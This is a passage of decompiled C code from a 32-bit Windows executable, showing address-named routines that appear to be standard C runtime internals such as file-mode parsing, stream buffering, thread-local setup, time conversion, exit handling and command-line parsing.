                    case 68: {
                        // 0x402b11
                        if ((v19 & 64) != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b16
                        v9 = v12;
                        v8 = v13;
                        v14 = v19 | 64;
                        v15 = v20;
                        // break -> 0x402ab3
                        break;
                    }
                    case 82: {
                        // 0x402afc
                        if (v13 != 0) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402b05
                        v9 = v12;
                        v8 = 1;
                        v14 = v19 | 16;
                        v15 = v20;
                        // break -> 0x402ab3
                        break;
                    }
                    default: {
                        // 0x402ae0
                        if (v21 == 83 != (v13 == 0)) {
                            // break -> 0x402ba2
                            break;
                        }
                        // 0x402af0
                        v9 = v12;
                        v8 = 1;
                        v14 = v19 | 32;
                        v15 = v20;
                        // break -> 0x402ab3
                        break;
                    }
                }
            }
            // 0x402ab3
            v16 = v15;
            v17 = v14;
            v7++;
            v18 = *(char *)v7;
            v10 = v17;
            v11 = v16;
        }
    }
    uint32_t v22 = function_4053af(a1, v10, a3, 420, (int32_t)&g167); // 0x402bae
    int32_t result = 0; // 0x402bba
    if (v22 >= 0) {
        // 0x402bc0
        g77++;
        *(int32_t *)(a4 + 12) = v11;
        *(int32_t *)(a4 + 4) = 0;
        *(int32_t *)a4 = 0;
        *(int32_t *)(a4 + 8) = 0;
        *(int32_t *)(a4 + 28) = 0;
        *(int32_t *)(a4 + 16) = v22;
        result = a4;
    }
    // 0x402bda
    return result;
}

// Address range: 0x402bdf - 0x402ca7
int32_t function_402bdf(int32_t a1) {
    // 0x402bdf
    function_403cab(2);
    int32_t v1; // bp-12, 0x402bdf
    int32_t v2 = &v1; // 0x402bf5
    int32_t v3 = v2; // 0x402bf6
    if (g162 < 1) {
        // 0x402c99
        *(int32_t *)(v3 - 4) = 2;
        function_403d0c((int32_t)&g167);
        return 0;
    }
    int32_t * v4 = (int32_t *)(v2 - 4);
    int32_t v5 = v2 - 8;
    int32_t * v6 = (int32_t *)v5;
    int32_t v7 = g162; // 0x402c30
    int32_t v8 = 0;
    int32_t v9 = 4 * v8; // 0x402c01
    int32_t v10 = *(int32_t *)(g160 + v9); // 0x402c01
    int32_t result; // 0x402bdf
    while (v10 != 0) {
        int32_t v11 = v7; // 0x402c0c
        if ((*(char *)(v10 + 12) & -125) == 0) {
            // 0x402c0e
            *v4 = v10;
            *v6 = v8;
            function_401dd3((int32_t)&g167, (int32_t)&g167);
            int32_t v12 = *(int32_t *)(g160 + v9); // 0x402c1d
            result = v12;
            if ((*(char *)(v12 + 12) & -125) == 0) {
                goto lab_0x402c83;
            }
            // 0x402c26
            *v4 = v12;
            *v6 = v8;
            function_401e25((int32_t)&g167, (int32_t)&g167);
            v11 = g162;
        }
        // 0x402c2f
        v7 = v11;
        int32_t v13 = v8 + 1; // 0x402c2f
        v3 = v2;
        if (v13 >= v7) {
            // 0x402c99
            *(int32_t *)(v3 - 4) = 2;
            function_403d0c((int32_t)&g167);
            return 0;
        }
        v8 = v13;
        v9 = 4 * v8;
        v10 = *(int32_t *)(g160 + v9);
    }
    // 0x402c3f
    *v4 = 56;
    int32_t * v14 = _malloc((int32_t)&g167); // 0x402c44
    *(int32_t *)(g160 + v9) = (int32_t)v14;
    int32_t v15 = *(int32_t *)(g160 + v9); // 0x402c58
    v3 = v2;
    if (v15 == 0) {
        // 0x402c99
        *(int32_t *)(v3 - 4) = 2;
        function_403d0c((int32_t)&g167);
        return 0;
    }
    // 0x402c5f
    *v4 = v15 + 32;
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
    *v6 = *(int32_t *)(g160 + v9) + 32;
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
    result = *(int32_t *)(g160 + v9);
    v2 = v5;
  lab_0x402c83:
    // 0x402c83
    if (result == 0) {
        // 0x402c99
        *(int32_t *)(v2 - 4) = 2;
        function_403d0c((int32_t)&g167);
        return 0;
    }
    // 0x402c87
    *(int32_t *)(result + 16) = -1;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)result = 0;
    *(int32_t *)(result + 28) = 0;
    // 0x402c99
    *(int32_t *)(v2 - 4) = 2;
    function_403d0c((int32_t)&g167);
    return result;
}

// Address range: 0x402ca7 - 0x402dbf
int32_t function_402ca7(int32_t a1, int32_t * a2) {
    int32_t v1 = (int32_t)a2;
    int32_t v2 = 0x1000000 * a1 / 0x1000000;
    int32_t v3 = v1 + 12; // 0x402caf
    int32_t * v4 = (int32_t *)v3; // 0x402caf
    int32_t v5 = *v4; // 0x402caf
    if ((v5 & 130) == 0) {
        // 0x402db3
        *v4 = v5 | 32;
        // 0x402dbb
        return -1;
    }
    if ((v5 & 64) != 0) {
        // 0x402db3
        *v4 = v5 | 32;
        // 0x402dbb
        return -1;
    }
    int32_t v6 = *(int32_t *)(v1 + 16); // 0x402cb2
    int32_t * v7 = (int32_t *)(v1 + 4);
    int32_t v8 = v5; // 0x402cc7
    if ((v5 & 1) != 0) {
        // 0x402cc9
        *v7 = 0;
        if ((v5 & 16) == 0) {
            // 0x402db3
            *v4 = v5 | 32;
            // 0x402dbb
            return -1;
        }
        // 0x402cd5
        v8 = v5 & -2;
        *a2 = *(int32_t *)(v1 + 8);
        *v4 = v8;
    }
    // 0x402cdf
    *v7 = 0;
    *v4 = v8 & -19 | 2;
    if ((v8 & 268) != 0) {
        goto lab_0x402d19;
    } else {
        if (a2 != &g16 == (a2 != &g17)) {
            // 0x402d12
            function_40536b(v1);
            goto lab_0x402d19;
        } else {
            // 0x402d07
            int32_t v9; // 0x402ca7
            if (function_403dad(v6, v9) != 0) {
                goto lab_0x402d19;
            } else {
                // 0x402d12
                function_40536b(v1);
                goto lab_0x402d19;
            }
        }
    }
  lab_0x402d19:;
    // 0x402d19
    int32_t v10; // 0x402ca7
    int32_t v11; // 0x402ca7
    int32_t v12; // 0x402ca7
    if ((*(int16_t *)v3 & 264) == 0) {
        // 0x402d89
        v11 = function_404f3d(v6, (int32_t)&v2, 1, v12);
        v10 = 1;
    } else {
        int32_t * v13 = (int32_t *)(v1 + 8); // 0x402d22
        int32_t v14 = *v13; // 0x402d22
        int32_t v15 = *a2 - v14; // 0x402d27
        *a2 = v14 + 1;
        *v7 = *(int32_t *)(v1 + 24) - 1;
        int32_t v16; // 0x402ca7
        if (v15 < 1) {
            int32_t v17 = &g27; // 0x402d4c
            if (v6 != -1) {
                int32_t v18 = *(int32_t *)(4 * v6 / 32 + (int32_t)&g153); // 0x402d58
                v17 = v18 + 36 * (v6 & 31);
            }
            // 0x402d6c
            v16 = 0;
            if ((*(char *)(v17 + 4) & 32) != 0) {
                // 0x402d72
                function_40567e(v6, 0, 2, v12);
                v16 = 0;
            }
        } else {
            // 0x402d39
            v16 = function_404f3d(v6, v14, v15, v12);
        }
        // 0x402d7f
        *(char *)*v13 = (char)v2;
        v11 = v16;
        v10 = v15;
    }
    // 0x402d9d
    int32_t result; // 0x402ca7
    if (v11 == v10) {
        // 0x402da9
        result = v2 & 255;
    } else {
        // 0x402da3
        *v4 = *v4 | 32;
        result = -1;
    }
    // 0x402dbb
    return result;
}

// Address range: 0x402dbf - 0x402e13
int32_t function_402dbf(void) {
    // 0x402dbf
    int32_t v1; // 0x402dbf
    function_403c82(v1);
    int32_t v2 = TlsAlloc(); // 0x402dc5
    g22 = v2;
    if (v2 == -1) {
        // 0x402e0f
        return 0;
    }
    int32_t v3 = function_403b74(1, 116); // 0x402dd9
    if (v3 == 0) {
        // 0x402e0f
        return 0;
    }
    int32_t * lpTlsValue = (int32_t *)v3; // 0x402ded
    if (!TlsSetValue(g22, lpTlsValue)) {
        // 0x402e0f
        return 0;
    }
    // 0x402df7
    function_402e13(v3);
    int32_t threadId = GetCurrentThreadId(); // 0x402dfe
    *(int32_t *)(v3 + 4) = -1;
    *lpTlsValue = threadId;
    return 1;
}

// Address range: 0x402e13 - 0x402e26
int32_t function_402e13(int32_t result) {
    // 0x402e13
    *(int32_t *)(result + 80) = (int32_t)&g23;
    *(int32_t *)(result + 20) = 1;
    return result;
}

// Address range: 0x402e26 - 0x402e8d
int32_t function_402e26(void) {
    int32_t errorCode = GetLastError(); // 0x402e28
    int32_t v1 = g22; // bp-12, 0x402e2e
    int32_t v2 = &v1; // 0x402e2e
    int32_t * v3 = TlsGetValue(g22); // 0x402e36
    if (v3 != NULL) {
        // 0x402e81
        *(int32_t *)(v2 - 4) = errorCode;
        SetLastError((int32_t)&g167);
        return (int32_t)v3;
    }
    int32_t v4 = 1; // bp-20, 0x402e44
    int32_t result = function_403b74(1, 116); // 0x402e46
    int32_t v5 = v2; // 0x402e51
    if (result != 0) {
        // 0x402e53
        v4 = g22;
        v5 = &v4;
        int32_t * lpTlsValue = (int32_t *)result; // 0x402e5a
        if (TlsSetValue(g22, lpTlsValue)) {
            // 0x402e64
            function_402e13(result);
            int32_t threadId = GetCurrentThreadId(); // 0x402e6b
            *(int32_t *)(result + 4) = -1;
            *lpTlsValue = threadId;
            // 0x402e81
            *(int32_t *)(v5 - 4) = errorCode;
            SetLastError((int32_t)&g167);
            return result;
        }
    }
    // 0x402e79
    *(int32_t *)(v5 - 4) = 16;
    __amsg_exit();
    // 0x402e81
    *(int32_t *)(v5 - 4) = errorCode;
    SetLastError((int32_t)&g167);
    return result;
}

// Address range: 0x402e8d - 0x402f4f
int32_t function_402e8d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x402e8d
    if (a1 > 2038) {
        // 0x402f4c
        return -1;
    }
    int32_t v1 = a1 - 1900; // 0x402e97
    int32_t v2 = *(int32_t *)(4 * a2 + (int32_t)&g55); // 0x402eb7
    int32_t v3; // 0x402e8d
    int32_t v4; // 0x402e8d
    int32_t v5; // 0x402e8d
    function_405756(v3, v4, v5);
    int32_t result = a6 + 0x7c558180 + (int32_t)g39 + 60 * (60 * (24 * ((a1 - 1901) / 4 + a3 + 365 * v1 + (int32_t)(a2 > 2 == (v1 & 3) == 0) + v2) + a4) + a5); // 0x402f13
    if (a7 != 1) {
        // 0x402f1f
        int32_t v6; // bp-40, 0x402e8d
        if (a7 != -1 || g40 == 0 || function_405a0b(&v6) == 0) {
            // 0x402f4c
            return result;
        }
    }
    // 0x402f4c
    return g41 + result;
}

// Address range: 0x402f4f - 0x402f7c
int32_t function_402f4f(void) {
    // 0x402f4f
    function_403055(&g6, &g7);
    return function_403055(&g4, &g5);
}

// Address range: 0x402f7c - 0x402f8d
int32_t function_402f7c(int32_t a1) {
    // 0x402f7c
    return function_402f9e(a1, 0, 0);
}

// Address range: 0x402f8d - 0x402f9e
int32_t function_402f8d(int32_t a1) {
    // 0x402f8d
    return function_402f9e(a1, 1, 0);
}

// Address range: 0x402f9e - 0x403041
int32_t function_402f9e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402f9e
    int32_t v1; // 0x402f9e
    function_403043(v1);
    int32_t v2; // bp-4, 0x402f9e
    int32_t * v3 = &v2; // 0x402fad
    if (g92 == 1) {
        int32_t * processHandle = GetCurrentProcess(); // 0x402fb3
        int32_t v4 = (int32_t)processHandle; // bp-12, 0x402fb9
        TerminateProcess(processHandle, (int32_t)&g167);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    int32_t v6 = *(int32_t *)(v5 + 16); // 0x402fc6
    g91 = 1;
    g90 = v6;
    int32_t * v7; // 0x402f9e
    int32_t * v8; // 0x402f9e
    if (*(int32_t *)(v5 + 12) != 0) {
        // 0x402fc0
        v8 = (int32_t *)(v5 - 12);
        v7 = (int32_t *)(v5 - 8);
    } else {
        // 0x402fd8
        int32_t * v9; // 0x402f9e
        if (g159 == 0) {
            // 0x402fd8
            v9 = (int32_t *)(v5 - 8);
        } else {
            int32_t * v10 = (int32_t *)(v5 - 8);
            int32_t v11 = g158 - 4; // 0x402fe8
            v9 = v10;
            if (v11 >= g159) {
                int32_t v12 = v11; // 0x402ff7
                v12 -= 4;
                v9 = v10;
                while (v12 >= g159) {
                    // 0x402fef
                    v12 -= 4;
                    v9 = v10;
                }
            }
        }
        // 0x403003
        *v9 = (int32_t)&g9;
        int32_t * v13 = (int32_t *)(v5 - 12);
        *v13 = (int32_t)&g8;
        function_403055(&g167, &g167);
        v8 = v13;
        v7 = v9;
    }
    // 0x403014
    *v7 = (int32_t)&g11;
    *v8 = (int32_t)&g10;
    function_403055(&g167, &g167);
    if (v6 != 0) {
        // 0x40302a
        return function_40304c();
    }
    // 0x403031
    *(int32_t *)(v5 - 4) = *(int32_t *)(v5 + 8);
    g92 = 1;
    ExitProcess((int32_t)&g167);
    // UNREACHABLE
}

// Address range: 0x403041 - 0x403043
int32_t function_403041(int32_t a1) {
    // 0x403041
    int32_t result; // 0x403041
    return result;
}

// Address range: 0x403043 - 0x40304c
int32_t function_403043(int32_t a1) {
    // 0x403043
    return function_403cab(13);
}

// Address range: 0x40304c - 0x403055
int32_t function_40304c(void) {
    // 0x40304c
    return function_403d0c(13);
}

// Address range: 0x403055 - 0x40306f
int32_t function_403055(int32_t * a1, int32_t * a2) {
    if (a1 >= a2) {
        // 0x40306d
        int32_t result; // 0x403055
        return result;
    }
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1 + 4; // 0x403068
    while (v2 < (uint32_t)(int32_t)a2) {
        // 0x403060
        v1 = v2;
        v2 = v1 + 4;
    }
    // 0x40306d
    return *(int32_t *)v1;
}

// Address range: 0x40306f - 0x4031ad
int32_t function_40306f(int32_t a1, int32_t ExceptionInfo) {
    int32_t v1 = function_402e26(); // 0x403075
    int32_t * v2 = (int32_t *)(v1 + 80); // 0x40307c
    int32_t v3 = function_4031ad(a1, *v2); // 0x403082
    if (v3 == 0) {
        // 0x4031a9
        return UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo);
    }
    int32_t * v4 = (int32_t *)(v3 + 8); // 0x403091
    int32_t v5 = *v4; // 0x403091
    if (v5 == 0) {
        // 0x4031a9
        return UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo);
    }
    if (v5 == 5) {
        // 0x4030a4
        *v4 = 0;
        // 0x4031a9
        return 1;
    }
    // 0x4030b0
    if (v5 == 1) {
        // 0x4031a9
        return -1;
    }
    int32_t * v6 = (int32_t *)(v1 + 84); // 0x4030b9
    int32_t v7 = *v6; // 0x4030b9
    *v6 = ExceptionInfo;
    if (*(int32_t *)(v3 + 4) != 8) {
        // 0x40318d
        *v4 = 0;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    int32_t v8 = g24; // 0x4030d1
    if (v8 < g25 + v8) {
        int32_t v9 = 12 * v8; // 0x4030e7
        int32_t v10 = v8; // 0x4030e7
        *(int32_t *)(v9 + 8 + *v2) = 0;
        v10++;
        v9 += 12;
        while (v10 < g25 + g24) {
            // 0x4030ea
            *(int32_t *)(v9 + 8 + *v2) = 0;
            v10++;
            v9 += 12;
        }
    }
    int32_t v11 = *(int32_t *)v3; // 0x40310b
    int32_t * v12 = (int32_t *)(v1 + 88); // 0x40310d
    int32_t v13 = *v12; // 0x40310d
    if (v11 == -0x3fffff72) {
        // 0x403117
        *v12 = 131;
        // 0x40317e
        *v12 = v13;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    if (v11 == -0x3fffff70) {
        // 0x403127
        *v12 = 129;
        // 0x40317e
        *v12 = v13;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    if (v11 == -0x3fffff6f) {
        // 0x403137
        *v12 = 132;
        // 0x40317e
        *v12 = v13;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    if (v11 == -0x3fffff6d) {
        // 0x403147
        *v12 = 133;
        // 0x40317e
        *v12 = v13;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    if (v11 == -0x3fffff73) {
        // 0x403157
        *v12 = 130;
        // 0x40317e
        *v12 = v13;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    if (v11 == -0x3fffff71) {
        // 0x403167
        *v12 = 134;
        // 0x40317e
        *v12 = v13;
        // 0x403195
        *v6 = v7;
        // 0x4031a9
        return -1;
    }
    if (v11 == -0x3fffff6e) {
        // 0x403177
        *v12 = 138;
    }
    // 0x40317e
    *v12 = v13;
    // 0x403195
    *v6 = v7;
    // 0x4031a9
    return -1;
}

// Address range: 0x4031ad - 0x4031e7
int32_t function_4031ad(int32_t a1, int32_t a2) {
    uint32_t v1 = 12 * g26 + a2;
    int32_t v2 = a2; // 0x4031c1
    int32_t result = a2; // 0x4031c1
    if (*(int32_t *)a2 != a1) {
        v2 += 12;
        result = v2;
        while (v2 < v1) {
            // 0x4031d0
            result = v2;
            if (*(int32_t *)v2 == a1) {
                // break -> 0x4031d4
                break;
            }
            v2 += 12;
            result = v2;
        }
    }
    // 0x4031d4
    if (result < v1) {
        // 0x4031de
        if (*(int32_t *)result == a1) {
            // 0x4031e4
            return result;
        }
    }
    // 0x4031e4
    return 0;
}

// Address range: 0x4031e7 - 0x4032a0
int32_t function_4031e7(void) {
    // 0x4031e7
    if (g157 == 0) {
        // 0x4031f4
        int32_t v1; // 0x4031e7
        int32_t v2; // 0x4031e7
        int32_t v3; // 0x4031e7
        function_4061e8(v1, v2, v3);
    }
    // 0x4031f9
    int32_t v4; // bp-12, 0x4031e7
    int32_t v5 = &v4; // 0x4031f1
    int32_t * v6 = (int32_t *)(v5 - 4);
    int32_t v7 = (int32_t)g75; // 0x4031ff
    int32_t v8 = 0; // 0x4031ff
    int32_t v9; // 0x4031e7
    while (true) {
      lab_0x403201:
        // 0x403201
        v9 = v8;
        v8 = v9;
        int32_t v10; // 0x4031e7
        switch (*(char *)v10) {
            case 0: {
                goto lab_0x403219;
            }
            case 61: {
                goto lab_0x40320c;
            }
            default: {
                // 0x40320b
                v8 = v9 + 1;
                goto lab_0x40320c;
            }
        }
    }
  lab_0x403219:
    // 0x403219
    *v6 = 4 * v9 + 4;
    int32_t * v11 = _malloc((int32_t)&g167); // 0x403221
    int32_t v12 = (int32_t)v11; // 0x403221
    g86 = v12;
    if (v11 == NULL) {
        // 0x403233
        *v6 = 9;
        __amsg_exit();
    }
    char * v13 = g75; // 0x40323b
    char * v14 = v13; // 0x403243
    int32_t * v15 = v11; // 0x403243
    if (*v13 != 0) {
        int32_t * v16 = (int32_t *)(v5 - 8); // 0x403246
        int32_t v17 = (int32_t)v13;
        *v16 = v17;
        int32_t v18 = function_403de0((int32_t)&g167) + 1; // 0x40324f
        int32_t v19 = v12; // 0x403253
        int32_t * v20; // 0x403256
        int32_t * v21; // 0x40325e
        if (*(char *)v17 != 61) {
            // 0x403255
            *v16 = v18;
            v20 = _malloc((int32_t)&g167);
            v21 = (int32_t *)v12;
            *v21 = (int32_t)v20;
            if (v20 == NULL) {
                // 0x403262
                *v16 = 9;
                __amsg_exit();
            }
            // 0x40326a
            *v16 = v17;
            *(int32_t *)(v5 - 12) = *v21;
            function_405d20((int32_t)&g167);
            v19 = v12 + 4;
        }
        int32_t v22 = v19;
        int32_t v23 = v18 + v17; // 0x403277
        while (*(char *)v23 != 0) {
            // 0x403246
            v17 = v23;
            int32_t v24 = v22;
            *v16 = v17;
            v18 = function_403de0((int32_t)&g167) + 1;
            v19 = v24;
            if (*(char *)v17 != 61) {
                // 0x403255
                *v16 = v18;
                v20 = _malloc((int32_t)&g167);
                v21 = (int32_t *)v24;
                *v21 = (int32_t)v20;
                if (v20 == NULL) {
                    // 0x403262
                    *v16 = 9;
                    __amsg_exit();
                }
                // 0x40326a
                *v16 = v17;
                *(int32_t *)(v5 - 12) = *v21;
                function_405d20((int32_t)&g167);
                v19 = v24 + 4;
            }
            // 0x403277
            v22 = v19;
            v23 = v18 + v17;
        }
        // 0x40327d
        v14 = g75;
        v15 = (int32_t *)v22;
    }
    // 0x40327e
    *v6 = (int32_t)v14;
    int32_t result = function_402709((int32_t)&g167); // 0x403284
    g75 = NULL;
    *v15 = 0;
    g156 = 1;
    return result;
  lab_0x40320c:
    // 0x40320c
    *v6 = v7;
    v7 = v7 + 1 + function_403de0((int32_t)&g167);
    goto lab_0x403201;
}

// Address range: 0x4032a0 - 0x403339
int32_t function_4032a0(void) {
    // 0x4032a0
    if (g157 == 0) {
        // 0x4032b2
        int32_t v1; // 0x4032a0
        int32_t v2; // 0x4032a0
        int32_t v3; // 0x4032a0
        function_4061e8(v1, v2, v3);
    }
    // 0x4032b7
    GetModuleFileNameA(NULL, (char *)&g93, 260);
    char * v4 = g163; // 0x4032c9
    g89 = (char *)&g93;
    int32_t v5 = *v4 == 0 ? (int32_t)&g93 : (int32_t)v4;
    int32_t v6; // bp-12, 0x4032a0
    int32_t v7; // bp-8, 0x4032a0
    function_403339(v5, 0, 0, &v7, &v6);
    int32_t * v8 = _malloc(4 * v7 + v6); // 0x4032f6
    if (v8 == NULL) {
        // 0x403304
        __amsg_exit();
    }
    int32_t v9 = (int32_t)v8; // 0x4032f6
    function_403339(v5, v9, 4 * v7 + v9, &v7, &v6);
    int32_t result = v7 - 1; // 0x403328
    g85 = v9;
    g84 = result;
    return result;
}

// Address range: 0x403339 - 0x4034ed
int32_t function_403339(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5) {
    // 0x403339
    *a5 = 0;
    *a4 = 1;
    int32_t v1 = 0; // 0x403359
    if (a2 != 0) {
        // 0x40335b
        *(int32_t *)a2 = a3;
        v1 = a2 + 4;
    }
    int32_t v2 = a1; // 0x403366
    int32_t v3 = a3; // 0x403366
    int32_t v4 = a1; // 0x403366
    int32_t v5 = a3; // 0x403366
    int32_t v6; // 0x403339
    int32_t v7; // 0x403339
    int32_t v8; // 0x403339
    int32_t v9; // 0x403339
    int32_t v10; // 0x403339
    int32_t v11; // 0x403339
    if (*(char *)a1 != 34) {
        while (true) {
          lab_0x4033ac:;
            int32_t v12 = v5;
            int32_t v13 = v4;
            *a5 = *a5 + 1;
            char * v14 = (char *)v13;
            int32_t v15 = 0; // 0x4033b0
            if (v12 != 0) {
                // 0x4033b2
                *(char *)v12 = *v14;
                v15 = v12 + 1;
            }
            int32_t v16 = v15;
            unsigned char v17 = *v14; // 0x4033b7
            int32_t v18 = v13 + 1; // 0x4033b9
            int32_t v19 = v18; // 0x4033c4
            int32_t v20 = v16; // 0x4033c4
            if ((*(char *)((int32_t)v17 + (int32_t)&g144) & 4) != 0) {
                // 0x4033c6
                *a5 = *a5 + 1;
                int32_t v21 = 0; // 0x4033ca
                if (v16 != 0) {
                    // 0x4033cc
                    *(char *)v16 = *(char *)v18;
                    v21 = v16 + 1;
                }
                // 0x4033d1
                v19 = v13 + 2;
                v20 = v21;
            }
            // 0x4033d2
            v5 = v20;
            v4 = v19;
            switch (v17) {
                case 32: {
                    goto lab_0x4033e7;
                }
                case 0: {
                    // 0x4033e4
                    v8 = v4 - 1;
                    v11 = v5;
                    goto lab_0x4033ef;
                }
                default: {
                    // 0x4033db
                    if (v17 == 9) {
                        // break -> 0x4033e7
                        break;
                    }
                    goto lab_0x4033ac;
                }
            }
        }
      lab_0x4033e7:
        // 0x4033e7
        v8 = v4;
        v11 = 0;
        if (v5 != 0) {
            // 0x4033eb
            *(char *)(v5 - 1) = 0;
            v8 = v4;
            v11 = v5;
        }
    } else {
        int32_t v22; // 0x403339
        int32_t v23; // 0x403339
        int32_t v24; // 0x403368
        char * v25; // 0x403339
        while (true) {
          lab_0x403368_2:
            // 0x403368
            v23 = v3;
            v22 = v2;
            v24 = v22 + 1;
            v25 = (char *)v24;
            unsigned char v26 = *v25; // 0x403368
            switch (v26) {
                case 34: {
                    goto lab_0x40339a;
                }
                case 0: {
                    goto lab_0x40339a;
                }
                default: {
                    char v27 = *(char *)((int32_t)v26 + (int32_t)&g144); // 0x403378
                    v7 = v24;
                    v10 = v23;
                    if ((v27 & 4) == 0) {
                        goto lab_0x40338d;
                    } else {
                        int32_t v28 = *a5; // 0x403381
                        *a5 = v28 + 1;
                        if (v23 == 0) {
                            // 0x40338d
                            *a5 = v28 + 2;
                            v6 = v24;
                            v9 = 0;
                            goto lab_0x403368;
                        } else {
                            // 0x403387
                            *(char *)v23 = *v25;
                            v7 = v22 + 2;
                            v10 = v23 + 1;
                            goto lab_0x40338d;
                        }
                    }
                }
            }
        }
      lab_0x40339a:
        // 0x40339a
        *a5 = *a5 + 1;
        int32_t v29 = 0; // 0x40339e
        if (v23 != 0) {
            // 0x4033a0
            *(char *)v23 = 0;
            v29 = v23 + 1;
        }
        // 0x4033a4
        v8 = *v25 != 34 ? v24 : v22 + 2;
        v11 = v29;
    }
    goto lab_0x4033ef;
  lab_0x403468:;
    // 0x403468
    int32_t v67; // 0x403339
    int32_t v79 = v67;
    int32_t v65; // 0x403339
    int32_t v80 = v65;
    int32_t v64; // 0x403339
    int32_t v82 = v64;
    int32_t v63; // 0x403339
    int32_t v81 = v63;
    int32_t v66; // 0x403339
    int32_t v83 = v66; // 0x40346d
    int32_t v50; // 0x403339
    int32_t v84 = v50; // 0x40346d
    int32_t v85 = v50; // 0x40346d
    if (v66 != 0) {
        int32_t v86 = v84;
        int32_t v87 = 0; // 0x403472
        if (v86 != 0) {
            // 0x403474
            *(char *)v86 = 92;
            v87 = v86 + 1;
        }
        // 0x403478
        *a5 = *a5 + 1;
        int32_t v88 = v83 - 1; // 0x40347a
        v83 = v88;
        v85 = v87;
        while (v88 != 0) {
            // 0x403470
            v86 = v87;
            v87 = 0;
            if (v86 != 0) {
                // 0x403474
                *(char *)v86 = 92;
                v87 = v86 + 1;
            }
            // 0x403478
            *a5 = *a5 + 1;
            v88 = v83 - 1;
            v83 = v88;
            v85 = v87;
        }
    }
    int32_t v76 = v85;
    char * v78 = (char *)v80;
    unsigned char v89 = *v78; // 0x40347d
    if (v89 == 0) {
        // break -> 0x4034cd
        goto lab_0x4034cd_2;
    }
    if (v81 != 0) {
        goto lab_0x403493;
    } else {
        switch (v89) {
            case 32: {
                goto lab_0x4034cd_2;
            }
            case 9: {
                goto lab_0x4034cd_2;
            }
            default: {
                goto lab_0x403493;
            }
        }
    }
  lab_0x403493:;
    int32_t v90 = v80; // 0x403497
    int32_t v91 = v76; // 0x403497
    if (v82 != 0) {
        char v92 = *(char *)((int32_t)v89 + (int32_t)&g144);
        int32_t v93; // 0x403339
        int32_t v94; // 0x403339
        if (v76 == 0) {
            // 0x4034b6
            v93 = v80;
            v94 = 0;
            if ((v92 & 4) != 0) {
                // 0x4034c2
                *a5 = *a5 + 1;
                v93 = v80 + 1;
                v94 = 0;
            }
        } else {
            char v95 = v89; // 0x4034a7
            int32_t v96 = v80; // 0x4034a7
            int32_t v97 = v76; // 0x4034a7
            if ((v92 & 4) != 0) {
                // 0x4034a9
                *(char *)v76 = v89;
                v96 = v80 + 1;
                *a5 = *a5 + 1;
                v95 = *(char *)v96;
                v97 = v76 + 1;
            }
            // 0x4034af
            *(char *)v97 = v95;
            v93 = v96;
            v94 = v97 + 1;
        }
        // 0x4034c5
        *a5 = *a5 + 1;
        v90 = v93;
        v91 = v94;
    }
    int32_t v45 = v81; // 0x4034c8
    int32_t v46 = v90 + 1; // 0x4034c8
    int32_t v47 = v91; // 0x4034c8
    int32_t v48 = v79; // 0x4034c8
    goto lab_0x403425;
  lab_0x403466:;
    // 0x403466
    int32_t v68; // 0x403339
    v63 = v68;
    int32_t v69; // 0x403339
    v64 = v69;
    int32_t v70; // 0x403339
    v65 = v70;
    int32_t v61; // 0x403339
    v66 = v61 / 2;
    int32_t v71; // 0x403339
    v67 = v71;
    goto lab_0x403468;
  lab_0x403458:;
    // 0x403458
    int32_t v51; // 0x403339
    v68 = v51 == 0;
    int32_t v72; // 0x403339
    v69 = v72;
    int32_t v73; // 0x403339
    v70 = v73;
    int32_t v44; // 0x403339
    v71 = v44;
    goto lab_0x403466;
  lab_0x40338d:;
    int32_t v98 = v10;
    int32_t v99 = v7;
    *a5 = *a5 + 1;
    v6 = v99;
    v9 = 0;
    if (v98 != 0) {
        // 0x403393
        *(char *)v98 = *(char *)v99;
        v6 = v99;
        v9 = v98 + 1;
    }
    goto lab_0x403368;
  lab_0x403368:
    // 0x403368
    v2 = v6;
    v3 = v9;
    goto lab_0x403368_2;
  lab_0x4033ef:;
    char v30 = *(char *)v8; // 0x4033f3
    char v31 = v30; // 0x4033f6
    int32_t v32 = v1; // 0x4033f6
    int32_t v33 = v11; // 0x4033f6
    int32_t v34 = v8; // 0x4033f6
    int32_t v35 = 0; // 0x4033f6
    int32_t v36 = v1; // 0x4033f6
    if (v30 != 0) {
        while (true) {
            int32_t v37 = v33;
            int32_t v38 = v32;
            char v39 = v31; // 0x4033fc
            int32_t v40 = v34; // 0x403401
            if (v39 != 32 != v39 != 9) {
                int32_t v41 = v40 + 1; // 0x403408
                char v42 = *(char *)v41; // 0x4033fc
                v40 = v41;
                while (v42 != 32 != v42 != 9) {
                    // 0x403408
                    v41 = v40 + 1;
                    v42 = *(char *)v41;
                    v40 = v41;
                }
                // 0x40340b
                v36 = v38;
                if (v42 == 0) {
                    // break -> 0x4034dc
                    break;
                }
            }
            int32_t v43 = 0; // 0x403416
            if (v38 != 0) {
                // 0x403418
                *(int32_t *)v38 = v37;
                v43 = v38 + 4;
            }
            // 0x403420
            v44 = v43;
            *a4 = *a4 + 1;
            v45 = v35;
            v46 = v34;
            v47 = v37;
            v48 = v43;
            while (true) {
              lab_0x403425:;
                int32_t v49 = v48;
                v50 = v47;
                v51 = v45;
                char v52 = *(char *)v46; // 0x40342e
                int32_t v53 = v46; // 0x403431
                int32_t v54 = v46; // 0x403431
                int32_t v55 = 0; // 0x403431
                char v56 = v52; // 0x403431
                if (v52 == 92) {
